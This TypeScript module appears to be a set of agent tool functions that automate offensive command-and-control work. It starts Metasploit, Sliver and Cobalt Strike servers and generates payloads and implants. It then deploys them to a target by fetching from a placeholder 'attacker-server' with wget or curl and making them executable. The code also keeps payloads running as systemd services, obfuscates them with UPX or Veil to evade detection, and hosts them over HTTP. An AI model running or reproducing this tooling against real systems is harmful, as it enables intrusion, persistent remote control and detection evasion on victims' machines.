import { executeCommand } from '../../core/shell.js';
import type { ToolResult } from '../../core/agentTypes.js';
import * as fs from 'fs/promises';
import * as path from 'path';

/**
 * 启动Metasploit监听器
 */
export async function startMetasploitListener(
  shellId: string,
  sessionDir: string,
  listenerConfig: {
    payload: string;
    lhost: string;
    lport: number;
    handler?: string;
  }
): Promise<ToolResult<{ listenerId: string; listenerInfo: any }>> {
  try {
    const rcFile = path.join(sessionDir, `msf_listener_${Date.now()}.rc`);

    // 生成Metasploit资源文件
    const rcContent = `
use exploit/multi/handler
set PAYLOAD ${listenerConfig.payload}
set LHOST ${listenerConfig.lhost}
set LPORT ${listenerConfig.lport}
set ExitOnSession false
exploit -j -z
`;

    await fs.writeFile(rcFile, rcContent);

    // 启动Metasploit监听器
    const result = await executeCommand(
      shellId,
      `msfconsole -q -r ${rcFile} > ${sessionDir}/msf_listener_${listenerConfig.lport}.log 2>&1 &`,
      { timeout: 10000 }
    );

    const listenerId = `msf_${listenerConfig.lport}_${Date.now()}`;

    return {
      success: true,
      data: {
        listenerId,
        listenerInfo: {
          type: 'metasploit',
          payload: listenerConfig.payload,
          lhost: listenerConfig.lhost,
          lport: listenerConfig.lport,
          logFile: `${sessionDir}/msf_listener_${listenerConfig.lport}.log`
        }
      },
      message: `Metasploit监听器启动成功: ${listenerConfig.lhost}:${listenerConfig.lport}`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `启动Metasploit监听器失败: ${error}`
    };
  }
}

/**
 * 生成Metasploit Payload
 */
export async function generateMetasploitPayload(
  shellId: string,
  sessionDir: string,
  payloadConfig: {
    payload: string;
    lhost: string;
    lport: number;
    format: string; // exe, elf, dll, war, jar, etc.
    arch?: string;
    platform?: string;
    encoder?: string;
    iterations?: number;
  }
): Promise<ToolResult<{ payloadPath: string; payloadSize: number }>> {
  try {
    const outputFile = path.join(sessionDir, `payload_${Date.now()}.${payloadConfig.format}`);

    let command = `msfvenom -p ${payloadConfig.payload} LHOST=${payloadConfig.lhost} LPORT=${payloadConfig.lport} -f ${payloadConfig.format}`;

    if (payloadConfig.arch) {
      command += ` -a ${payloadConfig.arch}`;
    }

    if (payloadConfig.platform) {
      command += ` --platform ${payloadConfig.platform}`;
    }

    if (payloadConfig.encoder) {
      command += ` -e ${payloadConfig.encoder}`;
    }

    if (payloadConfig.iterations) {
      command += ` -i ${payloadConfig.iterations}`;
    }

    command += ` -o ${outputFile}`;

    const result = await executeCommand(shellId, command, { timeout: 30000 });

    if (result.exitCode !== 0) {
      return {
        success: false,
        data: null as any,
        error: `生成payload失败: ${result.output}`
      };
    }

    // 获取文件大小
    const sizeResult = await executeCommand(shellId, `stat -c%s ${outputFile} 2>/dev/null || wc -c < ${outputFile}`);
    const payloadSize = parseInt(sizeResult.output.trim());

    return {
      success: true,
      data: {
        payloadPath: outputFile,
        payloadSize
      },
      message: `Payload生成成功: ${outputFile} (${payloadSize} bytes)`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `生成Metasploit Payload失败: ${error}`
    };
  }
}

/**
 * 启动Sliver C2服务器
 */
export async function startSliverServer(
  shellId: string,
  sessionDir: string,
  serverConfig: {
    lhost: string;
    lport: number;
    protocol: 'http' | 'https' | 'tcp' | 'mtls';
  }
): Promise<ToolResult<{ serverId: string; serverInfo: any }>> {
  try {
    const configFile = path.join(sessionDir, `sliver_${Date.now()}.json`);

    // 启动Sliver服务器
    let command = '';
    if (serverConfig.protocol === 'http' || serverConfig.protocol === 'https') {
      command = `sliver-server http -L ${serverConfig.lhost}:${serverConfig.lport} > ${sessionDir}/sliver_${serverConfig.lport}.log 2>&1 &`;
    } else if (serverConfig.protocol === 'mtls') {
      command = `sliver-server mtls -L ${serverConfig.lhost}:${serverConfig.lport} > ${sessionDir}/sliver_${serverConfig.lport}.log 2>&1 &`;
    }

    const result = await executeCommand(shellId, command, { timeout: 10000 });

    const serverId = `sliver_${serverConfig.lport}_${Date.now()}`;

    return {
      success: true,
      data: {
        serverId,
        serverInfo: {
          type: 'sliver',
          protocol: serverConfig.protocol,
          lhost: serverConfig.lhost,
          lport: serverConfig.lport,
          logFile: `${sessionDir}/sliver_${serverConfig.lport}.log`
        }
      },
      message: `Sliver C2服务器启动成功: ${serverConfig.protocol}://${serverConfig.lhost}:${serverConfig.lport}`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `启动Sliver服务器失败: ${error}`
    };
  }
}

/**
 * 生成Sliver Implant
 */
export async function generateSliverImplant(
  shellId: string,
  sessionDir: string,
  implantConfig: {
    name: string;
    c2Url: string;
    os: 'windows' | 'linux' | 'darwin';
    arch: 'amd64' | '386' | 'arm64';
    format: 'exe' | 'elf' | 'macho' | 'shared' | 'service';
    protocol: 'http' | 'https' | 'tcp' | 'mtls';
  }
): Promise<ToolResult<{ implantPath: string; implantSize: number }>> {
  try {
    const outputFile = path.join(sessionDir, `${implantConfig.name}.${implantConfig.format}`);

    const command = `sliver-client -c "generate --${implantConfig.protocol} ${implantConfig.c2Url} --os ${implantConfig.os} --arch ${implantConfig.arch} --format ${implantConfig.format} --save ${outputFile} ${implantConfig.name}"`;

    const result = await executeCommand(shellId, command, { timeout: 60000 });

    if (result.exitCode !== 0) {
      return {
        success: false,
        data: null as any,
        error: `生成Sliver implant失败: ${result.output}`
      };
    }

    // 获取文件大小
    const sizeResult = await executeCommand(shellId, `stat -c%s ${outputFile} 2>/dev/null || wc -c < ${outputFile}`);
    const implantSize = parseInt(sizeResult.output.trim());

    return {
      success: true,
      data: {
        implantPath: outputFile,
        implantSize
      },
      message: `Sliver implant生成成功: ${outputFile} (${implantSize} bytes)`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `生成Sliver Implant失败: ${error}`
    };
  }
}

/**
 * 启动Cobalt Strike Team Server
 */
export async function startCobaltStrikeServer(
  shellId: string,
  sessionDir: string,
  serverConfig: {
    host: string;
    port: number;
    password: string;
    profilePath?: string;
  }
): Promise<ToolResult<{ serverId: string; serverInfo: any }>> {
  try {
    let command = `./teamserver ${serverConfig.host} ${serverConfig.password}`;

    if (serverConfig.profilePath) {
      command += ` ${serverConfig.profilePath}`;
    }

    command += ` > ${sessionDir}/cobaltstrike_${serverConfig.port}.log 2>&1 &`;

    const result = await executeCommand(shellId, command, { timeout: 15000 });

    const serverId = `cs_${serverConfig.port}_${Date.now()}`;

    return {
      success: true,
      data: {
        serverId,
        serverInfo: {
          type: 'cobaltstrike',
          host: serverConfig.host,
          port: serverConfig.port,
          password: serverConfig.password,
          logFile: `${sessionDir}/cobaltstrike_${serverConfig.port}.log`
        }
      },
      message: `Cobalt Strike Team Server启动成功: ${serverConfig.host}:${serverConfig.port}`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `启动Cobalt Strike服务器失败: ${error}`
    };
  }
}

/**
 * 部署Payload到目标主机
 */
export async function deployPayloadToTarget(
  shellId: string,
  sessionDir: string,
  targetShellId: string,
  payloadPath: string,
  deployMethod: 'upload' | 'wget' | 'curl' | 'base64'
): Promise<ToolResult<{ deployed: boolean; remotePath: string }>> {
  try {
    const remotePath = `/tmp/payload_${Date.now()}`;

    if (deployMethod === 'upload') {
      // 直接上传（需要文件传输功能）
      const payloadContent = await fs.readFile(payloadPath, 'base64');
      await executeCommand(targetShellId, `echo "${payloadContent}" | base64 -d > ${remotePath} && chmod +x ${remotePath}`);
    } else if (deployMethod === 'wget') {
      // 使用wget下载（需要HTTP服务器）
      await executeCommand(targetShellId, `wget -O ${remotePath} http://attacker-server/payload && chmod +x ${remotePath}`);
    } else if (deployMethod === 'curl') {
      // 使用curl下载
      await executeCommand(targetShellId, `curl -o ${remotePath} http://attacker-server/payload && chmod +x ${remotePath}`);
    } else if (deployMethod === 'base64') {
      // Base64编码传输
      const payloadContent = await fs.readFile(payloadPath, 'base64');
      await executeCommand(targetShellId, `echo "${payloadContent}" | base64 -d > ${remotePath} && chmod +x ${remotePath}`);
    }

    return {
      success: true,
      data: {
        deployed: true,
        remotePath
      },
      message: `Payload部署成功: ${remotePath}`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `部署Payload失败: ${error}`
    };
  }
}

/**
 * 执行Payload
 */
export async function executePayload(
  targetShellId: string,
  payloadPath: string,
  executeMethod: 'direct' | 'nohup' | 'screen' | 'systemd'
): Promise<ToolResult<{ executed: boolean; pid?: number }>> {
  try {
    let command = '';

    if (executeMethod === 'direct') {
      command = `${payloadPath} &`;
    } else if (executeMethod === 'nohup') {
      command = `nohup ${payloadPath} > /dev/null 2>&1 &`;
    } else if (executeMethod === 'screen') {
      command = `screen -dmS payload ${payloadPath}`;
    } else if (executeMethod === 'systemd') {
      // 创建systemd服务
      const serviceName = `payload_${Date.now()}`;
      const serviceContent = `[Unit]
Description=Payload Service

[Service]
ExecStart=${payloadPath}
Restart=always

[Install]
WantedBy=multi-user.target`;

      await executeCommand(targetShellId, `echo "${serviceContent}" > /etc/systemd/system/${serviceName}.service`);
      await executeCommand(targetShellId, `systemctl daemon-reload && systemctl start ${serviceName} && systemctl enable ${serviceName}`);
      command = `systemctl status ${serviceName}`;
    }

    const result = await executeCommand(targetShellId, command);

    // 尝试获取PID
    const pidResult = await executeCommand(targetShellId, `pgrep -f ${payloadPath} | head -n 1`);
    const pid = pidResult.output.trim() ? parseInt(pidResult.output.trim()) : undefined;

    return {
      success: true,
      data: {
        executed: true,
        pid
      },
      message: `Payload执行成功${pid ? `, PID: ${pid}` : ''}`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `执行Payload失败: ${error}`
    };
  }
}

/**
 * 列出C2会话
 */
export async function listC2Sessions(
  shellId: string,
  c2Type: 'metasploit' | 'sliver' | 'cobaltstrike'
): Promise<ToolResult<{ sessions: Array<{ id: string; host: string; user: string; os: string; lastSeen: string }> }>> {
  try {
    let command = '';
    const sessions: Array<{ id: string; host: string; user: string; os: string; lastSeen: string }> = [];

    if (c2Type === 'metasploit') {
      // 使用msfconsole列出会话
      command = `msfconsole -q -x "sessions -l; exit"`;
      const result = await executeCommand(shellId, command, { timeout: 10000 });

      // 解析Metasploit会话输出
      const lines = result.output.split('\n');
      for (const line of lines) {
        const match = line.match(/(\d+)\s+(\S+)\s+(\S+)\s+(\S+)/);
        if (match) {
          sessions.push({
            id: match[1],
            host: match[2],
            user: match[3],
            os: match[4],
            lastSeen: 'active'
          });
        }
      }
    } else if (c2Type === 'sliver') {
      // 使用sliver-client列出会话
      command = `sliver-client -c "sessions"`;
      const result = await executeCommand(shellId, command, { timeout: 10000 });

      // 解析Sliver会话输出
      const lines = result.output.split('\n');
      for (const line of lines) {
        const match = line.match(/(\S+)\s+(\S+)\s+(\S+)\s+(\S+)/);
        if (match) {
          sessions.push({
            id: match[1],
            host: match[2],
            user: match[3],
            os: match[4],
            lastSeen: 'active'
          });
        }
      }
    }

    return {
      success: true,
      data: { sessions },
      message: `找到 ${sessions.length} 个C2会话`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `列出C2会话失败: ${error}`
    };
  }
}

/**
 * 与C2会话交互
 */
export async function interactC2Session(
  shellId: string,
  c2Type: 'metasploit' | 'sliver' | 'cobaltstrike',
  sessionId: string,
  command: string
): Promise<ToolResult<{ output: string }>> {
  try {
    let execCommand = '';

    if (c2Type === 'metasploit') {
      execCommand = `msfconsole -q -x "sessions -i ${sessionId} -c '${command}'; exit"`;
    } else if (c2Type === 'sliver') {
      execCommand = `sliver-client -c "use ${sessionId}; ${command}"`;
    }

    const result = await executeCommand(shellId, execCommand, { timeout: 30000 });

    return {
      success: true,
      data: {
        output: result.output
      },
      message: `命令执行成功`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `与C2会话交互失败: ${error}`
    };
  }
}

/**
 * 生成混淆Payload
 */
export async function generateObfuscatedPayload(
  shellId: string,
  sessionDir: string,
  payloadPath: string,
  obfuscationMethod: 'upx' | 'veil' | 'shellter' | 'custom'
): Promise<ToolResult<{ obfuscatedPath: string; originalSize: number; obfuscatedSize: number }>> {
  try {
    const obfuscatedPath = `${payloadPath}.obfuscated`;

    // 获取原始大小
    const originalSizeResult = await executeCommand(shellId, `stat -c%s ${payloadPath}`);
    const originalSize = parseInt(originalSizeResult.output.trim());

    if (obfuscationMethod === 'upx') {
      // 使用UPX压缩
      await executeCommand(shellId, `upx -9 -o ${obfuscatedPath} ${payloadPath}`);
    } else if (obfuscationMethod === 'veil') {
      // 使用Veil-Evasion
      await executeCommand(shellId, `veil -t Evasion -p ${payloadPath} -o ${obfuscatedPath}`);
    }

    // 获取混淆后大小
    const obfuscatedSizeResult = await executeCommand(shellId, `stat -c%s ${obfuscatedPath}`);
    const obfuscatedSize = parseInt(obfuscatedSizeResult.output.trim());

    return {
      success: true,
      data: {
        obfuscatedPath,
        originalSize,
        obfuscatedSize
      },
      message: `Payload混淆成功: ${originalSize} -> ${obfuscatedSize} bytes`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `Payload混淆失败: ${error}`
    };
  }
}

/**
 * 启动HTTP服务器用于Payload托管
 */
export async function startPayloadHostingServer(
  shellId: string,
  sessionDir: string,
  port: number,
  payloadDir: string
): Promise<ToolResult<{ serverId: string; serverUrl: string }>> {
  try {
    // 使用Python启动简单HTTP服务器
    const command = `cd ${payloadDir} && python3 -m http.server ${port} > ${sessionDir}/http_server_${port}.log 2>&1 &`;

    await executeCommand(shellId, command);

    // 获取本地IP
    const ipResult = await executeCommand(shellId, `hostname -I | awk '{print $1}'`);
    const localIp = ipResult.output.trim();

    const serverId = `http_${port}_${Date.now()}`;
    const serverUrl = `http://${localIp}:${port}`;

    return {
      success: true,
      data: {
        serverId,
        serverUrl
      },
      message: `HTTP服务器启动成功: ${serverUrl}`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `启动HTTP服务器失败: ${error}`
    };
  }
}
